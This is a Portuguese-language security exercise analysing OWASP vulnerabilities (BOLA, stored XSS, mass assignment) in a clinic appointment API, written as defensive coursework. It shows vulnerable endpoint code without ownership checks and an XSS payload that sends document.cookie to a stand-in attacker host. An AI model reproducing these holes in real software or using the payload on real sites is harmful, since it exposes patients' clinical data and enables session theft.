# Exercício 8 — Identificação de vulnerabilidades OWASP Top 10

Análise manual do código (sem scanner automatizado), conforme exigido: um
scanner não entende que "profissional só pode ver a própria consulta" é
uma regra de negócio — ele só sinaliza padrões genéricos.

## Vulnerabilidade 1 — Broken Object Level Authorization (BOLA)
**Categoria:** OWASP API Security Top 10 — API1:2023 (equivalente a A01:2021 Broken Access Control no Top 10 web)

**Onde:** `GET /appointments/{appointment_id}` — versão anterior ao
Exercício 9 não verificava se `current_user` tinha relação com a
`appointment_id` da URL, apenas que o token era válido.

```python
# ANTES (vulnerável) — app/routes/appointments.py
@router.get("/{appointment_id}", response_model=AppointmentRead)
def get_appointment(
    appointment_id: int,
    current_user=Depends(get_current_user),   # só checa "está autenticado"
    session: Session = Depends(get_session),
) -> Appointment:
    appointment = session.get(Appointment, appointment_id)
    if appointment is None:
        raise HTTPException(status_code=404)
    return appointment   # nenhuma checagem de ownership
```

**Evidência de exploração (`docs/evidence/ex8-bola-antes.txt`):** um
profissional (Bruno) autenticado legitimamente consegue ler, trocando
apenas o número na URL, uma consulta que pertence a outro profissional
(Ana) — `GET /appointments/1` retorna **HTTP 200** com o conteúdo
completo, incluindo notas clínicas confidenciais do paciente.

**Por que é grave neste domínio:** o dado exposto é prontuário/consulta
médica — dado sensível sob a LGPD. Qualquer profissional autenticado no
sistema (não precisa nem ser mal-intencionado desde o início) consegue
varrer IDs sequenciais e ler consultas de qualquer paciente da clínica.

## Vulnerabilidade 2 — Cross-Site Scripting (XSS) armazenado
**Categoria:** OWASP Top 10 2021 — A03:2021 Injection (XSS)

**Onde:** template `agenda.html`, se renderizado com auto-escape
desligado (ou usando o filtro `|safe` no campo `notes`) — cenário comum
quando alguém "corrige" um bug de exibição de acentuação/quebra de linha
sem entender a implicação de segurança do que está fazendo.

**Evidência (`docs/evidence/ex8-xss-antes.txt`):** o mesmo template,
renderizado com `autoescape=False`, produz literalmente
`<script>fetch('https://atacante.example/...'+document.cookie)</script>`
no HTML final — executável no navegador de qualquer recepcionista que
abrir a agenda do dia.

**Por que é grave neste domínio:** o campo `notes` é preenchido por
profissionais de saúde durante o atendimento — um profissional
comprometido (ou uma conta com credenciais vazadas) vira vetor de ataque
contra a própria recepção, podendo roubar o cookie de sessão dela e
assumir o painel administrativo interno.

## Vulnerabilidade 3 — Mass Assignment / Escalação de privilégio
**Categoria:** OWASP API Security Top 10 — API3:2023 Broken Object
Property Level Authorization (mass assignment)

**Onde:** `POST /auth/register`, se o schema `UserCreate` não tivesse
`extra='forbid'` (comportamento **padrão** do Pydantic é ignorar campos
extras silenciosamente — não rejeitá-los).

```python
# Comportamento padrão do Pydantic (sem extra="forbid") — hipotético:
class UserCreate(BaseModel):
    username: str
    password: str
    role: UserRole
# payload {"username": "x", "password": "y", "role": "recepcionista",
#          "is_active_override": True, "mfa_enabled": False}
# seria aceito e os campos extras simplesmente ignorados —
# mas o padrão de extra="ignore" do Pydantic é exatamente o que
# permitiria, em um schema irmão menos cuidadoso, que um atacante
# testasse até achar um nome de campo que o model realmente possui
# (ex.: reenviar "role": "admin" quando o campo deveria ser fixo).
```

O risco real e mais direto neste projeto era o `professional_id` em
`POST /appointments`: sem a lógica de sobrescrita por papel, um
profissional podia enviar o `professional_id` de um colega no corpo da
requisição e criar (e depois editar) uma consulta "em nome" de outra
pessoa.

**Evidência:** `test_professional_cannot_create_appointment_for_colleague`
e `test_privilege_escalation_via_mass_assignment_blocked` (ambos na
suíte real, ver Exercício 9) provam que a versão corrigida rejeita/ignora
esses vetores.

## Endpoint adicional com o mesmo padrão de BOLA (não citado acima)

`PATCH /appointments/{appointment_id}` e `GET /appointments` (listagem)
compartilham exatamente a mesma classe de falha da Vulnerabilidade 1: sem
a dependency de ownership, Bruno poderia **editar** a consulta de Ana
(não só ler) e vê-la aparecer na **sua própria listagem** de agenda. A
correção do Exercício 9 foi aplicada aos três pontos ao mesmo tempo,
porque os três dependem do mesmo `verify_appointment_ownership` — ver
`test_bola_blocked_on_update` e `test_bola_blocked_on_list`.
